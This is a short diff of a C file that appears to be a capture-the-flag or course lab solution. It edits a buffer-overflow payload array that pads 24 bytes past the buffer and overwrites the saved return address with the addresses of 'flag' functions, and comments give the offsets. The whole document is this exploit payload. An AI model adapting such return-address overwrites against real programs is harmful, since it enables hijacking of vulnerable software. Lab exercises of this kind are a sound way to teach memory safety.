@@ -12,13 +12,14 @@
 
 /* FIXME */
 unsigned char payload[] =
-	{'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
+	{'p', 'w', 'n', '3', 'd', '\0', 'H', 'A',
 	'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
 	'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
-	'H', 'A', 'H', 'A', 0xbb, 0x71, 0x88, 0x0c,
-	'H', 'A', 'H', 'A', 0xef, 0xbe, 0xad, 0xde, 'L', 'L', 'L'};
+	'H', 'A', 'H', 'A', 0x12, 0x71, 0x88, 0x0c,
+	'H', 'A', 'H', 'A', 0xe0, 0xb6, 0xff, 0xbf, 'L', 'L', 'L'};
 	//0x0c88724b is memory address of flag 1 function
 	//0x0c8871bb is memory address of flag 2 function
+	//0x0c887112 is memory address of flag 3 function
 	// Need 24 (to reach rbp) plus 4 bytes (28 total) to overwrite into return address
 
 int
